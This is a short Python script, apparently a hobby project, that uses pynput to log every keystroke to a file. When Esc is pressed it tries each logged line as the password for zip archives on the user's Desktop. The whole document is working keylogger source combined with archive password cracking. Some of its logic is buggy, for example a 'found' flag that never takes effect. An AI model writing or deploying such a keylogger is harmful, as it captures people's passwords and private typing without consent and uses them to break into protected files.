import pynput

import os, zipfile

from zipfile import ZipFile
from rarfile import RarFile
from pynput.keyboard import Key, Listener

count = 0
found = False
keys = []


def my_on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10 or key == Key.esc:
        count = 0
        write_file(keys)
        keys = []
    if key == Key.esc:
        search_for_password()

def try_to_hack(file_name, password):
    if file_name.__contains__(".zip"):
        with ZipFile(file_name, "r") as zf:
            try:
                dir = os.path.dirname(file_name)
                print(f"extracting to {dir} with password {password}")
                new_pass = ''.join(char for char in password if char.isalnum())
                zf.extractall(path=dir, pwd=new_pass.encode())
                print("after = " + password)
                zf.close()
                found = True
            except:
                print("we are in exeption")


def search_for_password():
#    try_to_hack("sdf.zip","sdf")
    with open("log.txt", "r") as f:
        dir_name = '/home/user/Desktop/'
        endzip = ".zip"

        os.chdir(dir_name)
        for item in os.listdir(dir_name):
            if item.endswith(endzip):
                file_name = os.path.abspath(item)
                print("file name = " + file_name)
                for line in f.readlines():
                    if not found:
                        try_to_hack(file_name, line)


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)


def my_on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=my_on_press, on_release=my_on_release) as listener:
    listener.join()

